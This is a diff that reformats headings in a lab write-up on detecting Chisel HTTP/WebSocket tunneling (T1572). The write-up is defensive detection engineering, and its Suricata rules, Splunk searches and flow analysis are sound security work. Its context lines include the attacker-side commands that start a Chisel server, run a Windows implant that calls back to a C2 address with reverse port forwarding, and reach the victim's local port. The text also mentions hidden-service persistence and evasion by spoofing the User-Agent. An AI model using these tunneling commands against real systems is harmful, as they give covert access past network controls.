@@ -1,4 +1,4 @@
-###  T1572 — HTTP/WebSocket Tunneling Detection (chisel)
+#  T1572 — HTTP/WebSocket Tunneling Detection (chisel)
 Protocol Tunneling involves encapsulating malicious traffic within standard, non-malicious network protocols to bypass defensive network controls and firewalls. This detection scenario specifically focuses on Chisel, a popular fast TCP/UDP tunnel transport tool that operates over HTTP and uses WebSockets for secure, persistent, and bidirectional communication.
 
 Since HTTP/HTTPS traffic is generally permitted in almost all enterprise environments, attackers leverage Chisel to mask their Command and Control (C2) communication or lateral movement activities inside legitimate-looking web traffic.
@@ -24,7 +24,7 @@ Typical real-world delivery methods for this client-side command include:
     Scheduled Tasks / Persistence: The command is registered as a hidden Windows Service or Scheduled Task to ensure the tunnel reconnects even if the system reboots.
 
 
-Step 1: Setting up the C2 Server (Attacker - Kali Linux)
+### Step 1: Setting up the C2 Server (Attacker - Kali Linux)
 
 The attacker starts a Chisel server listening on port 8080, configured to allow reverse port forwarding:
 
@@ -32,7 +32,7 @@ The attacker starts a Chisel server listening on port 8080, configured to allow 
 chisel server -p 8080 --reverse
 ```
 
-Step 2: Executing the Implant (Victim - Windows Endpoint)
+### Step 2: Executing the Implant (Victim - Windows Endpoint)
 
 Once inside the Windows environment, the attacker triggers the Chisel client (either via an exploited process, a malicious script, or a compromised account) to call back to the C2 server and forward local traffic:
 
@@ -40,7 +40,7 @@ Once inside the Windows environment, the attacker triggers the Chisel client (ei
 .\chisel.exe client 192.168.56.102:8080 R:9090:127.0.0.1:80
 ```
 
-Step 3: Port Forwarding Verification & Exploitation (Attacker - Kali Linux)
+### Step 3: Port Forwarding Verification & Exploitation (Attacker - Kali Linux)
 
 Once the Chisel client successfully establishes the reverse WebSocket tunnel, the Windows machine's local port 80 (or the targeted internal service) becomes accessible directly through the attacker's own local port 9090.
 
@@ -51,7 +51,7 @@ curl -v http://127.0.0.1:9090
 
 ```
 
-What Happens Behind the Scenes:
+### What Happens Behind the Scenes:
 
     The curl request hits the attacker's local port 9090.
 
@@ -163,7 +163,7 @@ The original rule in Section B is Layer 1. The sections below add Layers 2 and 3
 Why this matters: Chisel wraps its payload in an SSH session, so the tunnel contents are encrypted and cannot be inspected. Detection therefore relies entirely on metadata that leaks in cleartext — the HTTP handshake (User-Agent, GET /, 101 Switching Protocols) and the shape of the flow (duration, volume, regularity). The deeper the layer, the more it depends on behavior the attacker cannot easily hide without breaking the tunnel.
 
 
-# Layer 2 — Protocol Anomaly (WebSocket Upgrade)
+### Layer 2 — Protocol Anomaly (WebSocket Upgrade)
 
 The strongest cleartext indicator observed in the log was not the User-Agent — it was the protocol transition itself:
 
@@ -241,13 +241,13 @@ alert http $HOME_NET any -> any any (msg:"HUNT WebSocket Upgrade Handshake - pos
   }
 }
 ```
-1. Attacker Evasion Cost (Robustness)
+### 1. Attacker Evasion Cost (Robustness)
 
     SID: 200003 (Fragile): This rule relies entirely on a static string match. An attacker can blind this detection in 5 seconds simply by passing a custom user-agent flag (e.g., --header "User-Agent: Mozilla/5.0...").
 
     SID: 200004 (Durable): This rule targets a structural necessity of the tool. No matter what User-Agent is spoofed, Chisel must send Upgrade: websocket and Connection: Upgrade headers to successfully establish the full-duplex tunnel. Evading this requires the attacker to abandon Chisel or completely reconfigure the underlying transport mechanism.
 
-2. Threat Hunting & SIEM Fidelity
+### 2. Threat Hunting & SIEM Fidelity
 
     SID: 200003 (High Noise): Merely indicates a generic Go-based application in the network. In production, this surfaces massive false positives from legitimate utilities like Docker, Terraform, or Kubernetes components.
 
@@ -267,14 +267,15 @@ index=main sourcetype=_json (event_type=alert OR event_type=http)
 | where dest_port!=443
 | table _time src_ip dest_ip dest_port http.http_user_agent http.status
 ```
-Splunk: 
+
+### Verification in Splunk 
 ![Splunk Search](../screenshots/http-tunneling-3.png?v=2)
 
-Layer 3 — Flow Behavior (Long-Lived Channel + Beaconing)
+### Layer 3 — Flow Behavior (Long-Lived Channel + Beaconing)
 
 This is the layer the attacker cannot remove without abandoning the tunnel. A tunnel is, by definition, a long-lived carrier channel — not a short request/response. The flow events captured during this lab showed two distinct behavioral fingerprints.
 
-3a. Abnormally long-lived flow on a non-web port
+### 3a. Abnormally long-lived flow on a non-web port
 
 ```
 bytes_toserver: 17421, bytes_toclient: 13951, age: 716   <- ~12 minutes, bidirectional KBs
@@ -295,10 +296,10 @@ index=main sourcetype=_json event_type=flow
 | sort - age
 ```
 
-Splunk:
+### Verification in Splunk
 ![Splunk Search](../screenshots/http-tunneling-4.png?v=2)
 
-3b. Low-jitter, identical-size beaconing
+### 3b. Low-jitter, identical-size beaconing
 
 ```
 bytes_toserver: 330, bytes_toclient: 300, age: 2   <- this exact triplet repeated ~14 times
@@ -313,7 +314,7 @@ index=main sourcetype=_json event_type=flow
 | where count > 5
 | sort - count
 ```
-Splunk:
+### Verification in Splunk
 ![Splunk Search](../screenshots/http-tunneling-5.png?v=2)
 
 The 330/300 pair surfaces at the top of the count column — that constant-size repetition is the beacon.
